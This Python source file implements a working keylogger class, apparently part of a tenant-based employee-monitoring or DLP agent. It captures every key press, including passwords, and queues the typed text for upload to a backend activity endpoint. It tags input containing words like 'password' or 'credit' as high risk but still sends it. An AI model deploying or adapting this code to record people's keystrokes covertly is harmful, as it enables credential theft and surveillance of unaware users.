
from pynput import keyboard # type: ignore
import threading # type: ignore
import time # type: ignore
import logging # type: ignore
from datetime import datetime # type: ignore
from typing import Optional # type: ignore

class Keylogger:
    def __init__(self, agent_id, api_key, backend_url, data_queue=None):
        self.agent_id = agent_id
        self.api_key = api_key
        self.backend_url = backend_url
        self.data_queue = data_queue
        self.running = False
        self.logger = logging.getLogger("Keylogger")
        
        self.buffer = []
        self.last_flush = time.time()
        self.lock = threading.Lock()
        
        self.listener: Optional[keyboard.Listener] = None
        self._thread: Optional[threading.Thread] = None

    def start(self):
        if self.running: return
        self.running = True
        
        # Start Listener in non-blocking mode
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start() # type: ignore
        
        # Start Flush Timer
        self._thread = threading.Thread(target=self._flush_loop, daemon=True) # type: ignore
        self._thread.start() # type: ignore
        
        self.logger.info("Keylogger Started.")

    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop() # type: ignore
        if self._thread:
            self._thread.join(timeout=2) # type: ignore

    def on_press(self, key):
        try:
            char = key.char
            if char:
                with self.lock:
                    self.buffer.append(char)
        except AttributeError:
            # Special Keys
            k = str(key).replace("Key.", "")
            with self.lock:
                if k == "space":
                    self.buffer.append(" ")
                elif k == "enter":
                    self.buffer.append("\n")
                    self._flush_buffer(force=True)
                elif k == "backspace":
                    if self.buffer: self.buffer.pop()
                else:
                    self.buffer.append(f"<{k}>")

    def _flush_loop(self):
        while self.running:
            time.sleep(5)
            self._flush_buffer()

    def _flush_buffer(self, force=False):
        with self.lock:
            if not self.buffer: return
            
            # Flush if > 50 chars or forced (Enter) or Time > 10s
            now = time.time()
            if len(self.buffer) > 50 or force or (now - self.last_flush > 10):
                content = "".join(self.buffer)
                self.buffer = []
                self.last_flush = now
                self._send_log(content)

    def _send_log(self, content):
        if not content.strip(): return
        
        payload = {
            "AgentId": self.agent_id,
            "TenantApiKey": self.api_key,
            "ActivityType": "Keystrokes",
            "ProcessName": "Keylogger",
            "WindowTitle": f"Typing: {content[:200]}",
            "RiskLevel": "Normal",
            "Category": "Surveillance",
            "IdleSeconds": 0,
            "DurationSeconds": 0,
            "Timestamp": datetime.utcnow().isoformat(),
        }

        # DLP Check (Basic)
        if any(x in content.lower() for x in ["password", "login", "secret", "credit"]):
            payload["RiskLevel"] = "High"

        if self.data_queue:
            self.data_queue.enqueue("/api/events/activity", payload)
